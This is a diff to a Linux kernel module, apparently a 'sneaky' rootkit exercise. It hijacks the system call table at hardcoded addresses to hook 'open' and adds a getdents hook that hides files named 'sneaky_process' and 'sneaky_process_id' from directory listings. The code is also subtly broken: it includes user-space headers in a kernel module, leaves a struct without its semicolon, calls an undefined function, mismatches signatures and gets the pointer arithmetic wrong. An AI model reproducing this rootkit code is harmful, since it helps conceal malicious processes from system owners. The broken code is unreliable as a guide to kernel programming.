@@ -8,6 +8,17 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <string.h>
+#define _GNU_SOURCE
+#include <dirent.h>     /* Defines DT_* constants */
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <string.h>
+
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -21,25 +32,103 @@
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
+static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a01560;
 
+
+
+#define BUF_SIZE 1024
+struct linux_dirent {
+  unsigned long  d_ino;     /* Inode number */
+  unsigned long  d_off;     /* Offset to next linux_dirent */
+  unsigned short d_reclen;  /* Length of this linux_dirent */
+  char           d_name[];  /* Filename (null-terminated) */
+  /* length is actually (d_reclen - 2 -
+     offsetof(struct linux_dirent, d_name)) */
+  /*
+               char           pad;       // Zero padding byte
+               char           d_type;    // File type (only since Linux
+                                         // 2.6.4); offset is (d_reclen - 1)
+					 */
+}
+/*
+e.g.
+              inode#  file type  d_reclen  d_off d_name
+                  2  directory    16         12  .
+                  2  directory    16         24  ..
+                 11  directory    24         44  lost+found
+                 12  regular      16         56  a
+             228929  directory    16         68  sub
+              16353  directory    16         80  sub2
+             130817  directory    16       4096  sub3
+
+*/
+
+  
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_call_open)(const char *pathname, int flags);
+asmlinkage int (*original_call_getdents)(const char *pathname, int flags);
+asmlinkage int (*original_call_read)(const char *pathname, int flags);
+
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
+  printk(KERN_INFO "Very, very Sneaky!\n");  
+  return original_call_open(pathname, flags);
+}
+
+asmlinkage int sneaky_sys_getdents(unsigned int fd,
+				   struct linux_dirent *dirp,
+				   unsigned int count)
+{
   printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+
+
+  int nread = original_call_getdents(fd, dirp, count);
+  if(nread == -1) {
+    handle_error("getdents");
+  }
+
+  struct linux_dirent * d;
+  for (unsigned int bpos = 0; bpos < nread;) {
+    d = (struct linux_dirent *) (dirp + bpos);
+
+
+    if (strcmp(d->d_name, "sneaky_process") == 0 ||
+	strcmp(d->d_name, "sneaky_process_id") == 0) {
+
+      int dirent_len = d->d_reclen;
+      char* src = (char *) d + d->d_reclen;
+      char* end = (char *) dirp + nread;
+      memmove(d,
+	      src,
+	      (int)(end - src));
+      nread -=  dirent_len;
+
+    } else {
+      bpos += d->d_reclen;
+    }
+
+  }
+  
+  
+  
+  return nread;
+}
+
+asmlinkage int sneaky_sys_read(const char *pathname, int flags)
+{
+  printk(KERN_INFO "Very, very Sneaky!\n");  
+  return original_call_read(pathname, flags);
 }
 
 
@@ -65,7 +154,7 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
+  original_call_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   //Revert page to read-only
